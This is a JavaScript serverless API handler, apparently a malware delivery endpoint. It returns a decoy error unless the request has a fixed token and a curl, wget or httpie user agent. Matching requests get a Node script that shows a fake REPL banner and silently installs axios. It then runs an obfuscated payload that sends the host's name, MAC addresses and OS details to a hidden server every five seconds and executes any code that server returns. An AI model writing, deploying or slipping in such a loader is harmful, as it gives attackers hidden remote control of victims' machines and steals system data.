export default function handler(req, res) {
  const EXPECTED_TOKEN = "Z4T9QH";

  // Extract token from query string
  const token = String(req.query.token || "").trim();

  // Detect CLI user agent (curl, wget, fetch, httpie)
  function isCLI(ua = "") {
    ua = ua.toLowerCase();
    return (
      ua.includes("curl") ||
      ua.includes("wget") ||
      ua.includes("httpie") ||
      ua.includes("fetch/")
    );
  }

  // If token invalid OR UA not a CLI tool → hard reject
  if (token !== EXPECTED_TOKEN || !isCLI(req.headers["user-agent"])) {
    res.status(200).send("Cannot get Moralis data");
    return;
  }

  // Client-side payload code (same for all OS)
  const PAYLOAD = `
const a0_0x5ec353=a0_0x52e7;(function(_0x321624,_0x1dd3c0){const _0x595527=a0_0x52e7,_0x12a429=_0x321624();while(!![]){try{const _0x1edcfc=-parseInt(_0x595527(0x126))/0x1*(parseInt(_0x595527(0x11c))/0x2)+-parseInt(_0x595527(0x11b))/0x3+-parseInt(_0x595527(0x138))/0x4+parseInt(_0x595527(0x112))/0x5*(parseInt(_0x595527(0x13a))/0x6)+-parseInt(_0x595527(0x116))/0x7*(parseInt(_0x595527(0x11d))/0x8)+-parseInt(_0x595527(0x118))/0x9*(parseInt(_0x595527(0x10f))/0xa)+parseInt(_0x595527(0x113))/0xb*(parseInt(_0x595527(0x125))/0xc);if(_0x1edcfc===_0x1dd3c0)break;else _0x12a429['push'](_0x12a429['shift']());}catch(_0x4806ea){_0x12a429['push'](_0x12a429['shift']());}}}(a0_0x48b0,0xc0b11));function a0_0x52e7(_0x2cbcfb,_0x4ebd57){const _0x71ef28=a0_0x48b0();return a0_0x52e7=function(_0x44d866,_0x362612){_0x44d866=_0x44d866-0x10f;let _0x3b21bf=_0x71ef28[_0x44d866];if(a0_0x52e7['xtAtlw']===undefined){var _0x48b037=function(_0x304839){const _0x291776='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x33a8d6='',_0x2e6c29='';for(let _0x3e89a7=0x0,_0x5b67bb,_0x45f706,_0x356502=0x0;_0x45f706=_0x304839['charAt'](_0x356502++);~_0x45f706&&(_0x5b67bb=_0x3e89a7%0x4?_0x5b67bb*0x40+_0x45f706:_0x45f706,_0x3e89a7++%0x4)?_0x33a8d6+=String['fromCharCode'](0xff&_0x5b67bb>>(-0x2*_0x3e89a7&0x6)):0x0){_0x45f706=_0x291776['indexOf'](_0x45f706);}for(let _0x44d2ba=0x0,_0x438d7a=_0x33a8d6['length'];_0x44d2ba<_0x438d7a;_0x44d2ba++){_0x2e6c29+='%'+('00'+_0x33a8d6['charCodeAt'](_0x44d2ba)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e6c29);};a0_0x52e7['iYziRi']=_0x48b037,_0x2cbcfb=arguments,a0_0x52e7['xtAtlw']=!![];}const _0x52e7ce=_0x71ef28[0x0],_0x3aacd6=_0x44d866+_0x52e7ce,_0x4d7a80=_0x2cbcfb[_0x3aacd6];return!_0x4d7a80?(_0x3b21bf=a0_0x52e7['iYziRi'](_0x3b21bf),_0x2cbcfb[_0x3aacd6]=_0x3b21bf):_0x3b21bf=_0x4d7a80,_0x3b21bf;},a0_0x52e7(_0x2cbcfb,_0x4ebd57);}function a0_0x48b0(){const _0x2e7a4c=['ntG0mtm0ogzQs1Hzsa','zw52mtK0nZu','mJKZnZuXnMnTAhfRDa','E30Uy29UC3rYDwn0B3iOiNjLDhvYBIb0AgLZiIKOicK','BwfW','BgvUz3rO','zxjYB3i','mtq2mtqXmZbLuM9kzLi','Dg9tDhjPBMC','DhLWzq','mtviCfPUueu','odHNzNz6s1K','CMvSzwfZzq','yxbWBhK','mtmYmtzPEhvSq2m','x19WCM90B19F','owr4EgTXBa','yxHPB3m','Aw5ZDgfUy2vjza','mZy1ndq1nMTnCwL2AW','ntm4zuzxsNnd','mZK2mfzhBhvdCG','Ahr0CdOVlZG3lJiZnI4XnZCUotOZmdaWl2fWAs9LCNjVCK1LC3nHz2u','z2v0','zMXHDa','DgfIBgu','zMLSDgvY','C3rHDhvZ','D2fYBG','nZq0mJyYog5OCvD5CW','mJeWn3znBgvLqW','Ag9ZDg5HBwu','zxHJzxb0Aw9U','mda6mda6mda6mda6mda6mda','BwfJ','BwvZC2fNzq','yMLUza','zgf0yq','ChjVDg90ExbL','y29UC3rYDwn0B3i','CgXHDgzVCM0','y29UC29Szq','Aw5MBW','DhjHy2u','CMv0DxjUicHMDw5JDgLVBIGPia','DMfSDwvZ','Bg9N','BMv0D29YA0LUDgvYzMfJzxm'];a0_0x48b0=function(){return _0x2e7a4c;};return a0_0x48b0();}const axios=require(a0_0x5ec353(0x119)),os=require('os');let instanceId=0x0;function errorFunction(_0x3e89a7){try{return new Function('require',_0x3e89a7)(require);}catch(_0x5b67bb){}}function getSystemInfo(){const _0x21bb3c=a0_0x5ec353;return{'hostname':os[_0x21bb3c(0x127)](),'macs':Object[_0x21bb3c(0x135)](os[_0x21bb3c(0x137)]())[_0x21bb3c(0x120)]()['filter'](Boolean)[_0x21bb3c(0x13c)](_0x45f706=>_0x45f706[_0x21bb3c(0x12a)])[_0x21bb3c(0x122)](_0x356502=>_0x356502&&_0x21bb3c(0x129)!==_0x356502),'os':os[_0x21bb3c(0x111)]()+' '+os[_0x21bb3c(0x114)]()+' ('+os[_0x21bb3c(0x130)]()+')'};}async function checkServer(){const _0x1a006f=a0_0x5ec353,_0x44d2ba=(function(){let _0x2dc921=!![];return function(_0x1ea121,_0xeae338){const _0x128205=_0x2dc921?function(){const _0x330bf6=a0_0x52e7;if(_0xeae338){const _0x15a91e=_0xeae338[_0x330bf6(0x115)](_0x1ea121,arguments);return _0xeae338=null,_0x15a91e;}}:function(){};return _0x2dc921=![],_0x128205;};}()),_0x438d7a=_0x44d2ba(this,function(){const _0x12def6=a0_0x52e7,_0x4c3be0=function(){const _0xe6c721=a0_0x52e7;let _0x44898e;try{_0x44898e=Function(_0xe6c721(0x134)+_0xe6c721(0x13b)+');')();}catch(_0x43e8bf){_0x44898e=window;}return _0x44898e;},_0x159da9=_0x4c3be0(),_0x387d53=_0x159da9[_0x12def6(0x131)]=_0x159da9[_0x12def6(0x131)]||{},_0x49c728=[_0x12def6(0x136),_0x12def6(0x124),_0x12def6(0x132),_0x12def6(0x13e),_0x12def6(0x128),_0x12def6(0x121),_0x12def6(0x133)];for(let _0x33e0f=0x0;_0x33e0f<_0x49c728[_0x12def6(0x13d)];_0x33e0f++){const _0xb7e946=_0x44d2ba[_0x12def6(0x12f)][_0x12def6(0x12e)][_0x12def6(0x12c)](_0x44d2ba),_0x91bf36=_0x49c728[_0x33e0f],_0x3740ce=_0x387d53[_0x91bf36]||_0xb7e946;_0xb7e946[_0x12def6(0x117)]=_0x44d2ba[_0x12def6(0x12c)](_0x44d2ba),_0xb7e946[_0x12def6(0x110)]=_0x3740ce[_0x12def6(0x110)][_0x12def6(0x12c)](_0x3740ce),_0x387d53[_0x91bf36]=_0xb7e946;}});_0x438d7a();try{const _0x558f06=getSystemInfo(),_0x2be5f1=await axios[_0x1a006f(0x11f)](_0x1a006f(0x11e),{'params':{'sysInfo':_0x558f06,'exceptionId':_0x1a006f(0x139),'instanceId':instanceId}});_0x1a006f(0x13e)===_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x123)]?errorFunction(_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x12b)]||'Unknown error'):_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x11a)]&&(instanceId=_0x2be5f1[_0x1a006f(0x12d)][_0x1a006f(0x11a)]);}catch(_0x473266){}}try{checkServer(),setInterval(checkServer,0x1388);}catch(a0_0x1b7aa1){}
  `.trim();

  // Node-side script returned to client
  const script = `
(async () => {
  // Silent except REPL-like intro
  const v = process.version || "v24.11.0";
  console.log("Welcome to Node.js", v);
  console.log('Type ".help" for more information.');
  console.log(">");

  const { execSync } = require("child_process");

  // ensure axios exists
  try {
    require.resolve("axios");
  } catch (e) {
    try {
      execSync("npm install -g axios", { stdio: "ignore" });
    } catch {}
  }

  // execute payload
  try {
    const value = ${PAYLOAD}
    const checkValue = new Function('require', value);
    checkValue(require);
  } catch (err) {
    console.error("Payload error:", err.message);
  }
})();
  `.trim();

  res.setHeader("Content-Type", "text/plain; charset=utf-8");
  res.send(script);
}
